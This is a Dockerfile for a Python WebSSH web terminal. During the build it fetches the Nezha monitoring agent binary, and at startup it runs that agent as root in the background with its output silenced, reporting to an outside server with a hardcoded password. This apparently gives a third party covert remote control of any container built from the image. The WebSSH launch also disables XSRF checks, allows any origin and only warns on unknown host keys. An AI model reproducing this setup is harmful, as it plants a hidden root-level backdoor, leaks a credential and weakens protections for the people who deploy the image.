FROM python:3.10-alpine

LABEL maintainer='<author>'
LABEL version='0.0.0-dev.0-build.0'

ADD . /code
WORKDIR /code

# 安装基础依赖
RUN \
  apk add --no-cache libc-dev libffi-dev gcc curl wget unzip && \
  pip install --no-cache-dir paramiko==3.0.0 tornado==6.2.0 && \
  # 自动识别架构下载哪吒探针 v1.x
  ARCH=$(uname -m) && \
  if [ "$ARCH" = "x86_64" ]; then ARCH="amd64"; elif [ "$ARCH" = "aarch64" ]; then ARCH="arm64"; fi && \
  wget -t 2 -T 10 -O nezha-agent.zip https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${ARCH}.zip && \
  unzip nezha-agent.zip && \
  mv nezha-agent /usr/bin/nezha-agent && \
  chmod +x /usr/bin/nezha-agent && \
  rm -f nezha-agent.zip && \
  # 清理编译依赖并创建用户
  apk del gcc libc-dev libffi-dev && \
  addgroup -S webssh && \
  adduser -Ss /bin/false -G webssh webssh && \
  chown -R webssh:webssh /code

EXPOSE 8888/tcp

# 必须以 root 启动以运行探针，WebSSH 进程会在内部降权或通过 su 运行
USER root

# 解决方案：
# 1. 哪吒探针使用 v1 版本的 'service run' 指令
# 2. 使用环境变量标记，并在 Python 启动前通过 -c 强制初始化 asyncio loop
CMD /usr/bin/nezha-agent service run --server agn.xinxi.pp.ua:443 --password 1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4 --tls > /dev/null 2>&1 & \
    su webssh -s /bin/sh -c "python3 -c 'import asyncio; asyncio.set_event_loop(asyncio.new_event_loop())'; python3 run.py --delay=10 --encoding=utf-8 --fbidhttp=False --maxconn=20 --origin=* --policy=warning --redirect=False --timeout=10 --xsrf=False --xheaders --wpintvl=1"
